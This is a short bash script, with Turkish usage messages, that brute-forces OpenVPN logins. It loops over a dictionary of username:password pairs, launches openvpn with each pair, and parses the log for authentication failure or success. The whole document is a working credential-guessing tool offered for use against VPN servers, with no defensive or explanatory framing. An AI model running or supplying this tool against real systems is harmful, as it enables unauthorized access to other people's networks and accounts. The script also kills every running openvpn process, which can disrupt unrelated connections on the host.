#!/bin/bash
# By Galkan 

openvpn_binary_path="/usr/sbin/openvpn"

function brute_force()
{
  	brute_file="`mktemp /tmp/brute_force_openvpn_$USER.XXXXXX`"
	output_file="`mktemp /tmp/brute_force_openvpn_$USER.XXXXXX`"

	rm -f $brute_file $output_file

	user_name="$1"
	password="$2"

	echo "$user_name" > "$brute_file"
	echo "$password" >> "$brute_file"

	$openvpn_binary_path --config $openvpn_config_file --auth-user-pass "$brute_file" > $output_file &
	
	while [ 1 ]
	do
		if [ -f "$output_file" ]
		then
			cat $output_file | grep -q "Options error"
			if [ $? -eq 0 ]
			then
				echo "ERROR: `cat $output_file | grep "Options error"`"
				break
			fi

			cat $output_file | grep -q "SIGTERM\[soft,auth-failure\] received, process exiting" 
			if [ $? -eq 0 ]
			then
				echo "$user_name:$password -> FAILURE"
				break	
			fi

			cat $output_file | grep -q "Initialization Sequence Completed" 
			if [ $? -eq 0 ]
			then
				echo "$user_name:$password -> SUCCESS"
				break	
			fi
		else
			continue
		fi
	done
	
	openvpn_pid="`pidof openvpn`"
	kill -9 $openvpn_pid >/dev/null 2&>1

	rm -f $brute_file $output_file 
}



function main()
{
	dict_file="$1"

	for vpn_file in $openvpn_binary_path $openvpn_config_file $dict_file
	do
		if [ ! -f "$vpn_file" ]
		then
			echo "$vpn_file : Dosyasi Sistemde Bulunamadi !!!"
			exit 3
		fi
	done


	cat $dict_file | while read -r line
	do
		user_name="`echo "$line" | cut -d ":" -f1`"
		password="`echo "$line" | cut -d ":" -f2`"

		result="`brute_force "$user_name" "$password"`"
		echo "$result"

		echo "$result" | grep -Eq "^ERROR"
		if [ $? -eq 0 ]
		then
			break
		fi	
	done
}



if [ ! $# -eq 2 ]
then
	echo "Kullanim: $0 <dict_file> <vpn_config_file>"
	exit 1
else
	dict_file="$1"
	openvpn_config_file="$2"

	main "$dict_file" 
fi
